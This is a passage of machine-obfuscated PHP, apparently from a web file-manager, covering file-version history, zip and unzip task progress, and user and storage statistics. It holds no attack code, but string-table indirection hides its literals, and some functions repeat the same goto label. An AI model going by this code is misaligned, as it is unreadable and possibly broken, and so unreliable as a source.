$D[$cя[476]]); return md5(implode($cя[70], $cآ)); } private static function localFilePath($Fԏ, $c) { goto D; dՕ: if ($Aڐ == $C艵[102] || $Aڐ == $C艵[1071]) { if (!$cĤ->exist($cĤ->path)) { show_json(LNG($C艵[101]), !1); } return $cĤ->path; } return !1; goto d̏; fӅ: if ($d[$C艵[29]] == KodIO::KOD_SOURCE) { $dϟ = Model($C艵[768])->fileInfoGet(KodIO::sourceID($Fԏ)); if (!$dϟ[$C艵[75]]) { show_json($C艵[1070], !1); } $Fԏ = $dϟ[$C艵[75]]; } $cĤ = self::init($Fԏ); $Aڐ = $cĤ->getType(); goto dՕ; D: $C艵 =& $_SERVER[Ť]; if ($c == $C艵[1068] && strtoupper(substr(PHP_OS, 0, 3)) == $C艵[1069]) { return !1; } $d = KodIO::parse($Fԏ); goto fӅ; d̏: } private static function archiveExt($Fǋ = '') { $GLOBALS[$_SERVER[Ť][1072]] = $Fǋ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto eΌ; cҩֺ: Hook::bind($a֜Փ[1074], $a֜Փ[1075]); Hook::bind($a֜Փ[1076], $a֜Փ[1077]); Hook::bind($a֜Փ[1078], $a֜Փ[1079]); goto eǌ; eǌ: Hook::bind($a֜Փ[1080], $a֜Փ[1081]); Hook::bind($a֜Փ[1082], $a֜Փ[1083]); Hook::bind($a֜Փ[1084], $a֜Փ[1085]); goto aĸ; eΌ: $a֜Փ =& $_SERVER[Ť]; $e = $GLOBALS[$a֜Փ[6]][$a֜Փ[84]][$a֜Փ[1073]]; if ($e <= 0) { return; } goto cҩֺ; aĸ: } public static function eventBeforeUpload($DЕ) { if ($DЕ[3] && $DЕ[3] != REPEAT_REPLACE) { return; } $dʝ = self::parsePath($DЕ[0]); if (!$dʝ) { return; } self::add($dʝ); } public static function eventBeforeEdit($A񄕘) { $D = self::parsePath($A񄕘[0]); if (!$D) { return; } self::add($D); } public static function eventBeforeCopyFile($Fꐨ, $fߓަ, $f♊, $Dڋ, $cơ۴, $b鞭) { $eڷ = $f♊->getPathOuter($Dڋ); $aҏݵ = self::parsePath($eڷ); if (!$aҏݵ) { return; } self::add($aҏݵ); } public static function eventBeforeRename($c) { $Dޮ =& $_SERVER[Ť]; $bÆܶ = self::parsePath($c[0]); if (!$bÆܶ) { return; } $Fݾ߼ = self::checkInHistory($bÆܶ); if (!$Fݾ߼) { return; } if ($Fݾ߼[$Dޮ[29]] == $Dޮ[171]) { $b = self::listData($bÆܶ); if ($b && $b[$Dޮ[361]]) { self::moveHistory($bÆܶ, $c[1]); } } else { IO::rename($Fݾ߼[$Dޮ[75]], $c[1]); } } public static function eventBeforeMove($eȼ) { goto dԅێ; dԅێ: $f럩 =& $_SERVER[Ť]; $Bͱ = self::parsePath($eȼ[0]); if (!$Bͱ) { return; } goto Eɦ; aܠ: $aύ雉ԇ = self::checkInHistory($Bͱ); if (!$aύ雉ԇ) { return; } $dԪ = self::pathHistory($fѸ); goto F; Eɦ: $fѸ = self::parsePath($eȼ[1]); if (!$fѸ) { return; } $eڈ = $eȼ[3]; goto aܠ; F: if ($aύ雉ԇ[$f럩[29]] == $f럩[171]) { $Aև = self::listData($Bͱ); $bǺ = rtrim($fѸ, $f럩[8]) . $f럩[8] . ($eڈ ? $eڈ : get_path_this($Bͱ)); $c = self::listData($bǺ); if ($Aև && $Aև[$f럩[361]] && $c && $c[$f럩[361]]) { return self::clear($Bͱ); } if ($Aև && $Aև[$f럩[361]]) { self::moveHistory($Bͱ, $eڈ, $dԪ); } } else { IO::move($aύ雉ԇ[$f럩[75]], $dԪ, !1, $eڈ); self::clearEmptyFolder(IO::pathFather($aύ雉ԇ[$f럩[75]])); } goto dϤ; dϤ: } public static function eventAfterRemove($dՎ, $Bں) { goto Fɶ; Fɶ: $fͻ =& $_SERVER[Ť]; if (!$Bں) { return; } $F֎ = self::parsePath($dՎ[0]); goto cǌ٩; cǌ٩: if (!$F֎) { return; } $FˑƜ = self::checkInHistory($F֎); if (!$FˑƜ) { return; } goto c; c: if ($FˑƜ[$fͻ[29]] == $fͻ[171]) { $eӂ = self::listData($F֎, !1); if ($eӂ && $eӂ[$fͻ[361]]) { self::clear($F֎, !1); } } else { IO::remove($FˑƜ[$fͻ[75]]); self::clearEmptyFolder(IO::pathFather($FˑƜ[$fͻ[75]])); } goto A׎; A׎: } private static function checkInHistory($b) { $EȆҤ = self::pathHistory($b); if (!IO::exist($EȆҤ)) { $EȆҤ .= $_SERVER[Ť][1086]; } return IO::exist($EȆҤ) ? IO::info($EȆҤ) : !1; } private static function parsePath($cثي) { goto F߂ې; F߂ې: $d򊆄 =& $_SERVER[Ť]; if (!$cثي) { return !1; } if ($GLOBALS[$d򊆄[1087]]) { return; } goto a; d爫: return $cثي; goto CЇ; bڋǈ: $f퐙 = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $d򊆄[1089]); foreach ($f퐙 as $eʱÎ) { if (!$Cދ && substr($cثي, 0, strlen($eʱÎ)) == $eʱÎ) { return !1; } } self::log($GLOBALS[$d򊆄[1013]] . $d򊆄[1090] . $cثي); goto d爫; a: $E = KodIO::parse($cثي); $Cދ = $E[$d򊆄[29]]; $C̗ = !$Cދ || $Cދ == KodIO::KOD_IO || $Cދ == KodIO::KOD_SHARE_ITEM; goto F; F: if (!$C̗ || !$E[$d򊆄[1088]]) { return !1; } if ($Cދ == KodIO::KOD_SHARE_ITEM) { $C׻ = IO::init($cثي); if ($C׻->pathParse[$d򊆄[1018]]) { return self::parsePath($C׻->pathParse[$d򊆄[1018]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto bڋǈ; CЇ: } private static function pathHistory($B) { $C쏓× =& $_SERVER[Ť]; $d = self::$_historyBase . ltrim(KodIO::clear($B), $C쏓×[8]); $d = str_replace(array($C쏓×[1091]), array($C쏓×[1092]), $d); return $d; } public static function log($Bݎ) { } public static function historyCount($a͇) { $f =& $_SERVER[Ť]; $eٲۘ = array(); $aĿ = array(); foreach ($a͇ as $a) { $E = get_path_father($a); if (!$aĿ[$E]) { $aĿ[$E] = array(); } $aĿ[$E][] = get_path_this($a); } foreach ($aĿ as $E => $bݑ) { $E = self::parsePath($E); if (!$E) { continue; } foreach ($bݑ as $b) { $C̥ = self::listData(rtrim($E, $f[8]) . $f[8] . $b, !1); if ($C̥ && $C̥[$f[361]]) { $eٲۘ[rtrim($E, $f[8]) . $f[8] . $b] = count($C̥[$f[361]]); } } } return $eٲۘ; } public static function add($F︫) { goto A; dÂڜ: $CٿĒ٣ = Model($Fժ[1093])->get($Fժ[1094]); $F׆ = $GLOBALS[$Fժ[6]][$Fժ[84]][$Fժ[1073]]; $Cٮ = $CٿĒ٣ == $Fժ[1095] ? 5 : $F׆; goto a; D؂: $Dҕ = array($Fժ[383] => $aԺ谎, $Fժ[168] => $d脢׿, $Fժ[28] => $bΞ[$Fժ[28]] . $Fժ[91] . date($Fժ[1096]) . rand_string(1), $Fժ[77] => $bΞ[$Fժ[77]], $Fժ[394] => USER_ID, $Fժ[190] => time(), $Fժ[1097] => $Fժ[33]); IO::mkdir($cȇ֡[$Fժ[1098]]); $Aĥ = IO::copy($F︫, $cȇ֡[$Fժ[1098]], !1, $Dҕ[$Fժ[28]]); goto Aӯ; B: return self::saveData($cȇ֡[$Fժ[1099]], $c); goto D; A: $Fժ =& $_SERVER[Ť]; $cȇ֡ = self::listData($F︫); if (!$cȇ֡) { return; } goto dÂڜ; a: if ($F׆ <= 0) { return; } $d脢׿ = IO::hashSimple($F︫); $bΞ = IO::info($F︫); goto aߟ; Aӯ: if (!$Aĥ) { self::clearEmptyFolder($cȇ֡[$Fժ[1098]]); return !1; } array_unshift($c, $Dҕ); if (count($c) > $Cٮ) { $B㴊 = array_slice($c, $Cٮ); foreach ($B㴊 as $CȺ) { IO::remove($cȇ֡[$Fժ[1098]] . $CȺ[$Fժ[28]]); } $c = array_slice($c, 0, $Cٮ); } goto B; aߟ: $c = $cȇ֡[$Fժ[361]]; if ($bΞ[$Fժ[77]] == 0) { return; } if ($bΞ[$Fժ[77]] >= 1024 * 1024 * 500) { return !1; } goto BƧ; BƧ: if ($c && $c[0][$Fժ[168]] == $d脢׿) { return !0; } if (array_key_exists($Fժ[192], $bΞ) && !$bΞ[$Fժ[192]]) { return !1; } $aԺ谎 = short_id(time()); goto D؂; D: } public static function remove($FԞ, $aط) { $e˼ш =& $_SERVER[Ť]; $B܆ = self::listData($FԞ); $E = array(); if (!$B܆) { return !1; } foreach ($B܆[$e˼ш[361]] as $b) { if ($b[$e˼ш[383]] == $aط) { IO::remove($B܆[$e˼ш[1098]] . $b[$e˼ш[28]]); continue; } $E[] = $b; } return self::saveData($B܆[$e˼ш[1099]], $E); } public static function clear($dԏȑ, $E۫ = true) { $c =& $_SERVER[Ť]; $Eꑄ = self::listData($dԏȑ, $E۫); if (!$Eꑄ) { return !1; } foreach ($Eꑄ[$c[361]] as $A顄) { IO::remove($Eꑄ[$c[1098]] . $A顄[$c[28]]); } return self::saveData($Eꑄ[$c[1099]], array()); } public static function moveHistory($C΂, $Fޟٜ = '', $e = '') { goto Bǈ; F: $Dڨ̰ = substr(get_path_this($a⧓[$ȇ[1099]]), 0, -strlen($dƜ)); foreach ($a⧓[$ȇ[361]] as $bÌτ => $D) { $Aؿɞ = $Fޟٜ . substr($D[$ȇ[28]], strlen($Dڨ̰)); $Cǯа = IO::move($a⧓[$ȇ[1098]] . $D[$ȇ[28]], $e, !1, $Aؿɞ); if ($Cǯа) { $a⧓[$ȇ[361]][$bÌτ][$ȇ[28]] = $Aؿɞ; } } $a⧓[$ȇ[1099]] = IO::move($a⧓[$ȇ[1099]], $e, !1, $Fޟٜ . $dƜ); goto b; aօ: $dƜ = $ȇ[1086]; $Fޟٜ = $Fޟٜ ? $Fޟٜ : get_path_this($C΂); $e = $e ? $e : $a⧓[$ȇ[1098]]; goto F; b: self::saveData($a⧓[$ȇ[1099]], $a⧓[$ȇ[361]]); self::clearEmptyFolder($a⧓[$ȇ[1098]]); goto cҵ; Bǈ: $ȇ =& $_SERVER[Ť]; $a⧓ = self::listData($C΂, !1); if (!$a⧓ || !$a⧓[$ȇ[361]]) { return !1; } goto aօ; cҵ: } public static function rollback($cͤ, $Aգ) { $E =& $_SERVER[Ť]; $d = self::listData($cͤ); if (!$d) { return; } $Eǉ = IO::info($cͤ); foreach ($d[$E[361]] as $eඬ => $aŹȰ) { if ($aŹȰ[$E[383]] == $Aգ) { self::add($cͤ); $dƬ = $d[$E[1098]] . $aŹȰ[$E[28]]; $Fޥ = IO::copy($dƬ, IO::pathFather($cͤ), REPEAT_REPLACE, $Eǉ[$E[28]]); if ($Fޥ) { self::remove($cͤ, $Aգ); } return $Fޥ; } } return !1; } public static function setDetail($b, $Eب, $b읞) { $C =& $_SERVER[Ť]; $C秠 = self::listData($b); if (!$C秠) { return; } foreach ($C秠[$C[361]] as $c֬羚 => $F) { if ($F[$C[383]] == $Eب) { $C秠[$C[361]][$c֬羚][$C[1097]] = $b읞; self::saveData($C秠[$C[1099]], $C秠[$C[361]]); return !0; } } return !1; } public static function fileInfo($e, $C) { goto BܢƬ; a؛΍: return IO::info($c); goto E،; c: $c = $E[33]; foreach ($dҾ[$E[361]] as $F => $Aȭ) { if ($Aȭ[$E[383]] != $C) { continue; } $c = $dҾ[$E[1098]] . $Aȭ[$E[28]]; break; } if (!$c) { show_json(LNG($E[101]), !1); } goto a؛΍; BܢƬ: $E =& $_SERVER[Ť]; $dҾ = self::listData($e); if (!$dҾ) { show_json(LNG($E[101]), !1); } goto c; E،: } public static function fileOut($D򷮥, $a, $B = false) { $aԃ =& $_SERVER[Ť]; $dǇ = self::fileInfo($D򷮥, $a); $A壼 =& $GLOBALS[$aԃ[7]]; $B = isset($A壼[$aԃ[1064]]) && $A壼[$aԃ[1064]] == 1; if (isset($A壼[$aԃ[29]]) && $A壼[$aԃ[29]] == $aԃ[1100]) { return IO::fileOutImage($dǇ[$aԃ[75]], $A壼[$aԃ[1101]]); } IO::fileOut($dǇ[$aԃ[75]], $B, get_path_this($D򷮥)); } public static function listData($E, $cᙗ = true) { goto D; D: $E݌ =& $_SERVER[Ť]; if ($cᙗ && !IO::exist($E)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto f; f: if (substr($E, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $a刾 = self::pathHistory($E); $dǴߓ = array($E݌[1099] => $a刾 . $E݌[1086], $E݌[1098] => rtrim(get_path_father($a刾), $E݌[8]) . $E݌[8], $E݌[361] => array()); goto d拋; d拋: $C = IO::getContent($dǴߓ[$E݌[1099]]); if ($C) { $f֚ = json_decode($C, !0); if (is_array($f֚)) { $dǴߓ[$E݌[361]] = $f֚; } } return $dǴߓ; goto Fѡ; Fѡ: } private static function saveData($CѨ, $c) { goto Bգ; e߷㒭: $C = IO::pathFather($CѨ); IO::remove($CѨ); self::clearEmptyFolder($C); goto b޺; Bգ: $B쒺Χ =& $_SERVER[Ť]; self::log($B쒺Χ[1102] . $CѨ . $B쒺Χ[67] . count($c), $B쒺Χ[701]); if ($c) { return IO::setContent($CѨ, json_encode($c)); } goto e߷㒭; b޺: return !0; goto Dɺۦ; Dɺۦ: } public static function clearEmptyFolder($D) { goto Aٗ阔̙; bڇц: $fЃ褑 = IO::has($D, !0); if ($fЃ褑[$F╡[199]] > 0 || $fЃ褑[$F╡[200]] > 0) { return; } IO::remove($D); goto dŇ; Aٗ阔̙: $F╡ =& $_SERVER[Ť]; if (trim($D, $F╡[8]) == trim(self::$_historyBase, $F╡[8])) { return; } $C܈ = IO::pathFather($D); goto bڇц; dŇ: self::clearEmptyFolder($C܈); goto fҜ; fҜ: } private static function getBasePath() { goto a; C: $a = DATA_PATH . $e剖[1105]; $a = IO::mkdir($a); $a = rtrim($a, $e剖[8]) . $e剖[8]; goto F҅׊; F҅׊: file_put_contents($a . $e剖[1106], $e剖[33]); Model($e剖[1103])->set($e剖[1104], $a); return $a; goto Cū; a: $e剖 =& $_SERVER[Ť]; $a = Model($e剖[1103])->get($e剖[1104]); if (IO::exist($a)) { return $a; } goto C; Cū: } } goto C; eΔʟ: define($_SERVER[Ť][233], 2); define($_SERVER[Ť][234], 3); define($_SERVER[Ť][235], 1); goto A˜; cВ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto C棬; Bת: Hook::bind($A֨[1059], array($this, $A֨[1571])); $F =& $this->task; $F[$A֨[1572]] = $A֨[1064]; goto Aė؏; Aė؏: if (!$F[$A֨[1398]]) { $F[$A֨[1398]] = LNG($A֨[1573]); } goto A; C棬: $A֨ =& $_SERVER[Ť]; parent::startAfter(); Hook::bind($A֨[1569], array($this, $A֨[1570])); goto Bת; A: } protected function endAfter() { $fĝ =& $_SERVER[Ť]; parent::endAfter(); Hook::unbind($fĝ[1569], array($this, $fĝ[1570])); Hook::unbind($fĝ[1059], array($this, $fĝ[1571])); } public function updateAfter() { $C٥ =& $_SERVER[Ť]; $d؄ŵ =& $this->task; if (!$d؄ŵ[$C٥[992]] || !$d؄ŵ[$C٥[708]]) { return; } if ($d؄ŵ[$C٥[1572]] == $C٥[1064]) { $BË = 0; if ($d؄ŵ[$C٥[1538]]) { $BË = $d؄ŵ[$C٥[1539]] / $d؄ŵ[$C٥[1538]]; } $d؄ŵ[$C٥[1494]] = $BË * 0.3; } else { if ($d؄ŵ[$C٥[1572]] == $C٥[307]) { $BË = $d؄ŵ[$C٥[1006]] / $d؄ŵ[$C٥[992]]; $d؄ŵ[$C٥[1494]] = 0.3 + $BË * 0.4; } else { if ($d؄ŵ[$C٥[1572]] == $C٥[103]) { $CȾ = 0; if ($d؄ŵ[$C٥[1540]] == $C٥[103]) { $CȾ = $d؄ŵ[$C٥[1539]]; } $BË = ($d؄ŵ[$C٥[1543]] + $CȾ) / $d؄ŵ[$C٥[708]]; $d؄ŵ[$C٥[1494]] = 0.3 + 0.4 + $BË * 0.3; } } } if ($d؄ŵ[$C٥[1494]] > 0) { $e = timeFloat() - $d؄ŵ[$C٥[1496]] - $d؄ŵ[$C٥[1499]]; $d؄ŵ[$C٥[1500]] = $e * (1 - $d؄ŵ[$C٥[1494]]) / $d؄ŵ[$C٥[1494]]; } } public function addFile($Bŧ) { goto a⺍; aƫձ: $A[$f۩ӗ[1536]] = $a[$f۩ӗ[28]]; $A[$f۩ӗ[1538]] = $a[$f۩ӗ[77]]; $A[$f۩ӗ[1539]] = 0; goto bլ; b޿: $this->update(); goto a; Bġ: $A[$f۩ӗ[992]] = 1; $bŭ = 0; $A[$f۩ӗ[1547]] = array($f۩ӗ[1548] => $bŭ + 1, $f۩ӗ[402] => $a[$f۩ӗ[28]], $f۩ӗ[75] => $a[$f۩ӗ[75]], $f۩ӗ[483] => $a[$f۩ӗ[483]] ? $a[$f۩ӗ[483]] : $a[$f۩ӗ[75]]); goto b޿; bլ: $A[$f۩ӗ[994]] = $f۩ӗ[1555]; $A[$f۩ӗ[1540]] = $f۩ӗ[1064]; $A[$f۩ӗ[708]] = $a[$f۩ӗ[77]]; goto Bġ; a⺍: $f۩ӗ =& $_SERVER[Ť]; $A =& $this->task; $a = IO::info($Bŧ); goto aƫձ; a: } public function unzipAfter($b٥) { goto fؖ; Eβ: $E¦[$AȎ[1006]] = 0; $E¦[$AȎ[1538]] = 0; $E¦[$AȎ[1539]] = 0; goto a; bӶӒ: $C = IO::infoWithChildren($b٥); $f鸕ʝ = 0; $E¦[$AȎ[1547]] = array($AȎ[1548] => $f鸕ʝ + 1, $AȎ[402] => $C[$AȎ[28]], $AȎ[75] => $C[$AȎ[75]], $AȎ[483] => $C[$AȎ[483]] ? $C[$AȎ[483]] : $C[$AȎ[75]]); goto A; a: $E¦[$AȎ[1536]] = $AȎ[33]; $E¦[$AȎ[1543]] = 0; $E¦[$AȎ[708]] = $C[$AȎ[77]]; goto B; B: $this->update(); self::log($AȎ[1574] . json_encode(array($E¦, $C))); goto f; fؖ: $AȎ =& $_SERVER[Ť]; $E¦ =& $this->task; $E¦[$AȎ[1572]] = $AȎ[103]; goto bӶӒ; A: if ($C[$AȎ[29]] == $AȎ[171]) { $E¦[$AȎ[992]] = 1; } else { $E¦[$AȎ[992]] = $C[$AȎ[80]][$AȎ[78]]; } $E¦[$AȎ[994]] = $AȎ[33]; $E¦[$AȎ[1540]] = 0; goto Eβ; f: } public function nameParse($Eٛ) { goto aޤՐ; aޤՐ: $F =& $_SERVER[Ť]; $a =& $this->task; if ($a[$F[1572]] == $F[1064]) { $a[$F[1572]] = $F[307]; $a[$F[1543]] = 0; $a[$F[708]] = 0; } goto eᭊ; eᭊ: $A嶧 = get_path_this($Eٛ); if (strstr($A嶧, $F[91])) { $a[$F[1006]] += 1; $a[$F[992]] += 1; } $a[$F[1536]] = $Eٛ; goto c̠熆; c̠熆: $this->update(); goto aҴҌ; aҴҌ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $a☳ٛ =& $_SERVER[Ť]; parent::startAfter(); Hook::bind($a☳ٛ[1575], array($this, $a☳ٛ[1570])); $A =& $this->task; $A[$a☳ٛ[1572]] = $a☳ٛ[1064]; if (!$A[$a☳ٛ[1398]]) { $A[$a☳ٛ[1398]] = LNG($a☳ٛ[1576]); } } protected function endAfter() { $aӞ =& $_SERVER[Ť]; parent::endAfter(); Hook::unbind($aӞ[1575], array($this, $aӞ[1570])); } public function updateAfter() { $Fкթ =& $_SERVER[Ť]; $e =& $this->task; if (!$e[$Fкթ[992]] || !$e[$Fкթ[708]]) { return; } if ($e[$Fкթ[1572]] == $Fкթ[1064]) { $a = $e[$Fкթ[1539]]; if ($e[$Fкթ[1540]] != $Fкթ[1064]) { $a = 0; } $Fĸ = ($e[$Fкթ[1543]] + $a) / $e[$Fкթ[708]]; $e[$Fкթ[1494]] = $Fĸ * 0.3; } else { if ($e[$Fкթ[1572]] == $Fкթ[307]) { $Fĸ = $e[$Fкթ[1006]] / $e[$Fкթ[992]]; $e[$Fкթ[1494]] = 0.3 + $Fĸ * 0.5; } else { if ($e[$Fкթ[1572]] == $Fкթ[103]) { $Fĸ = 0; if ($e[$Fкթ[1538]]) { $Fĸ = $e[$Fкթ[1539]] / $e[$Fкթ[1538]]; } $e[$Fкթ[1494]] = 0.3 + 0.5 + $Fĸ * 0.2; } } } if ($e[$Fкթ[1494]] > 0) { $a֖܍ = timeFloat() - $e[$Fкթ[1496]] - $e[$Fкթ[1499]]; $e[$Fкթ[1500]] = $a֖܍ * (1 - $e[$Fкթ[1494]]) / $e[$Fкթ[1494]]; } } public function copyFileStart($Dډ, $d, $c₞, $Fј౔, $AՎ, $d٣) { $fﾘͧ =& $_SERVER[Ť]; parent::copyFileStart($Dډ, $d, $c₞, $Fј౔, $AՎ, $d٣); $c뛅 =& $this->task; if ($c뛅[$fﾘͧ[1572]] == $fﾘͧ[307]) { $c뛅[$fﾘͧ[1572]] = $fﾘͧ[103]; } $this->update(); } public function copyFileEnd($Fɴ, $d, $B؞ߵ, $b堲, $B, $a棟) { $B˫ݝ =& $_SERVER[Ť]; $CΨԵ =& $this->task; $CΨԵ[$B˫ݝ[1539]] = $CΨԵ[$B˫ݝ[1538]]; $CΨԵ[$B˫ݝ[1543]] += $CΨԵ[$B˫ݝ[1538]]; $CΨԵ[$B˫ݝ[1540]] = $B˫ݝ[33]; $this->update(); } public function nameParse($A̋) { $c֭ =& $_SERVER[Ť]; $BǴ =& $this->task; if ($BǴ[$c֭[1006]] < $BǴ[$c֭[992]]) { $Bڑʅ = get_path_this($A̋); if (strstr($Bڑʅ, $c֭[91])) { $BǴ[$c֭[1006]] += 1; } } if ($BǴ[$c֭[1572]] == $c֭[1064]) { $BǴ[$c֭[1572]] = $c֭[307]; } $BǴ[$c֭[1536]] = $A̋; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($A近) { $C =& $_SERVER[Ť]; $eڃߍ = array($C[551] => array($C[29] => $C[1577], $C[267] => array($C[218], $C[710], $C[1578], $C[1579])), $C[1580] => array($C[29] => $C[1581], $C[267] => array($C[218], $C[708], $C[1582], $C[1583], $C[1584]))); if (!isset($eڃߍ[$A近])) { return !1; } $this->optionType = $eڃߍ[$A近][$C[29]]; $this->field = $eڃߍ[$A近][$C[267]]; return !0; } public function listData($f蠸ܦ = false, $F̽ί = "\155\x6f\144\x69\146\171\124\151\155\x65", $cǌ = false) { return parent::listData($f蠸ܦ, $F̽ί, $cǌ); } public function trendList($cïϷ) { goto A; D̹: if (!isset($Cμݣ)) { $Bэ = $cïϷ == $EĂ[551] ? $EĂ[494] : $EĂ[768]; $Cμݣ = Model($Bэ)->min($EĂ[190]); } $a = $EĂ[1587] . ucfirst($cïϷ); $CЎ = $this->dateList($Cμݣ); goto D͹Ս; D͹Ս: foreach ($CЎ as $dě΅) { $this->{$a}($dě΅); } return $this->listData(); goto dش; A: $EĂ =& $_SERVER[Ť]; $E = $this->listData(); if ($E) { $BҾ = end($E); $dě΅ = date($EĂ[1585], strtotime($EĂ[1586])); if ($BҾ[$EĂ[218]] == $dě΅) { return $E; } $Cμݣ = strtotime($BҾ[$EĂ[218]]); } goto D̹; dش: } private function dateList($A) { $Aܭ =& $_SERVER[Ť]; $Fݓ = $A; $f = strtotime($Aܭ[1586]); $Có = array(); while ($Fݓ <= $f) { $Có[] = date($Aܭ[1585], $Fݓ); $Fݓ = strtotime($Aܭ[1588], $Fݓ); } return $Có; } public function _recordUser($Aë = '') { goto B; dې: $bꝂ = array($Dᓍ[190] => array($Dᓍ[941], $A܂)); $E = Model($Dᓍ[494])->where($bꝂ)->count($Dᓍ[1493]); $bꝂ[$Dᓍ[190]] = array($Dᓍ[327], array($E߳, $A܂)); goto F; aň: $d = array($Dᓍ[218] => $Aë, $Dᓍ[710] => (int) $E, $Dᓍ[1578] => (int) $f, $Dᓍ[1579] => (int) $d􅧹); return $this->insert($d); goto Cɦ; B: $Dᓍ =& $_SERVER[Ť]; $E߳ = strtotime(date($Dᓍ[1589], strtotime($Aë))); $A܂ = strtotime(date($Dᓍ[1590], strtotime($Aë))); goto dې; F: $f = Model($Dᓍ[494])->where($bꝂ)->count($Dᓍ[1493]); $bꝂ[$Dᓍ[29]] = $Dᓍ[1591]; $d􅧹 = Model($Dᓍ[1592])->where($bꝂ)->count($Dᓍ[1593]); goto aň; Cɦ: } public function _recordStore($c = '') { goto d֏; F: $B᤿[$Aی[387]] = 1; $E = Model($Aی[768])->where($B᤿)->sum($Aی[77]); $B᤿[$Aی[387]] = 2; goto e䨻Ю; e䨻Ю: $aǤ = Model($Aی[768])->where($B᤿)->sum($Aی[77]); $a = array($Aی[218] => $c, $Aی[708] => (int) $aˈ, $Aی[1582] => (int) $d, $Aی[1583] => (int) $E, $Aی[1584] => (int) $aǤ); return $this->insert($a); goto Dу; b냃: $d = Model($Aی[438])->where($B᤿)->sum($Aی[77]); $B᤿[$Aی[386]] = 0; $aˈ = Model($Aی[768])->where($B᤿)->sum($Aی[77]); goto F; d֏: $Aی =& $_SERVER[Ť]; $c͈탥 = strtotime(date($Aی[1590], strtotime($c))); $B᤿ = array($Aی[190] => array($Aی[941], $c͈탥)); goto b냃; Dу: } public function trend($b, $C) { goto C; C: $F =& $_SERVER[Ť]; if (!$this->init($b)) { return !1; } $dײ = $this->trendList($b); goto B; c: return $e; goto D˦ً; c: if (empty($dײ)) { $bч = date($F[1585], strtotime($F[1586])); $bŘҸ = array($F[218] => $bч); foreach ($F碕ˇ[$b] as $BЅ => $b͊͏ϱ) { $bŘҸ[$BЅ] = 0; } $dײ[] = $bŘҸ; } $e = array(); foreach ($dײ as $b͊͏ϱ) { if ($b == $F[1580] && $b͊͏ϱ[$F[1582]] > $b͊͏ϱ[$F[708]]) { $b͊͏ϱ[$F[1582]] = $b͊͏ϱ[$F[708]]; } foreach ($F碕ˇ[$b] as $BЅ => $C) { $A = array($F[218] => $b͊͏ϱ[$F[218]], $F[1398] => $C); $A[$dӵ[$b]] = isset($b͊͏ϱ[$BЅ]) ? $b͊͏ϱ[$BЅ] : 0; $e[] = $A; } } goto c; B: if ($dײ && $C != $F[1467]) { $E솂 = $dײ[0][$F[218]]; $b = $this->validDate($C, $E솂); $d = array(); $a降 = array_to_keyvalue($dײ, $F[218]); foreach ($b as $bч) { if (isset($a降[$bч])) { $A = $a降[$bч]; } else { $A = end($dײ); $A[$F[218]] = $bч; if ($b == $F[551]) { $A[$F[1578]] = $A[$F[1579]] = 0; } } $d[] = $A; } $dײ = $d; } $F碕ˇ = array($F[551] => array($F[710] => LNG($F[1594]), $F[1578] => LNG($F[1595]), $F[1579] => LNG($F[1596])), $F[1580] => array($F[708] => LNG($F[1597]), $F[1582] => LNG($F[1598]), $F[1583] => LNG($F[1599]), $F[1584] => LNG($F[1600]))); $dӵ = array($F[551] => $F[1601], $F[1580] => $F[77]); goto c; D˦ً: } public function validDate($d, $a곰) { goto cȰ; E: return $CՈ; goto fޒ; bԊ: switch ($d) { case $Fķ[1474]: $b = mktime(0, 0, 0, date($Fķ[1602]), date($Fķ[1218]) - date($Fķ[1281]) + 7 - 7, date($Fķ[1603])); $f = 0; do { $b = date($Fķ[1585], $b - 3600 * 24 * 7 * $f); $CՈ[] = $b; $f++; } while ($a곰 < $b); break; case $Fķ[1472]: $f = 1; do { $Cƽ = date($Fķ[1604], strtotime("\55\40{$f}\40\x6d\157\156\x74\150\x73")); $CՈ[] = $Cƽ; $f++; } while ($a곰 < $Cƽ); break; case $Fķ[1605]: $a = (int) date($Fķ[1603], strtotime($a곰)); $DΎÇ = (int) date($Fķ[1603]); if ($a >= $DΎÇ) { break; } for ($a; $a < $DΎÇ; $a++) { $CՈ[] = $a . $Fķ[1606]; } break; default: break; } if ($a곰 > end($CՈ)) { array_pop($CՈ); } sort($CՈ); goto E; cȰ: $Fķ =& $_SERVER[Ť]; $aƯꥧ = date($Fķ[1585], strtotime($Fķ[1586])); $CՈ = array($aƯꥧ); goto bԊ; fޒ: } public function listTable($DЭ) { $dꨦ = ucfirst($DЭ); return Model($dꨦ)->listData(); } public function option($c详) { $Eĉ = $_SERVER[Ť][1607] . ucfirst($c详); return $this->{$Eĉ}(); } private function optionUser() { goto Eޅՙ; dꦴ: $a = Model($cݑ[494])->where($f)->count($cݑ[1493]); return array($cݑ[705] => (int) $aݩ, $cݑ[1611] => (int) ($aݩ - $CŨ), $cݑ[1612] => (int) $CŨ, $cݑ[1613] => (int) $a, $cݑ[1614] => $Eã); goto FԠ; B񃰄: if (!$Eã) { $Eã = 1; } $Eƈ = strtotime(date($cݑ[1589])); $f = array($cݑ[1610] => array($cݑ[942], $Eƈ)); goto dꦴ; D: $Eƈ = strtotime($cݑ[1609]); $f = array($cݑ[1610] => array($cݑ[942], $Eƈ)); $Eã = (int) Model($cݑ[494])->where($f)->count($cݑ[1493]); goto B񃰄; Eޅՙ: $cݑ =& $_SERVER[Ť]; $aݩ = Model($cݑ[494])->count($cݑ[1493]); $CŨ = Model($cݑ[494])->where($cݑ[1608])->count($cݑ[1493]); goto D; FԠ: } private function optionFile() { goto A; b: $Cܹ = Model($a[768])->where($d)->sum($a[77]); $d = Model($a[768])->where($d)->count($a[385]); return array($a[708] => $B, $a[1582] => $Aݚʂ, $a[1615] => $B - $Aݚʂ, $a[1616] => (int) $Cܹ, $a[710] => (int) $B٭ʶ, $a[1617] => (int) $d); goto bۼ; A: $Aݚʂ = $eˇ[$a[1582]]; $B٭ʶ = Model($a[768])->where(array($a[386] => 0))->count($a[385]); $d = array($a[386] => 0, $a[190] => array($a[942], strtotime(date($a[1589])))); goto b; A: $a =& $_SERVER[Ť]; $eˇ = $this->sourceSize(); $B = $eˇ[$a[77]]; goto A; bۼ: } private function 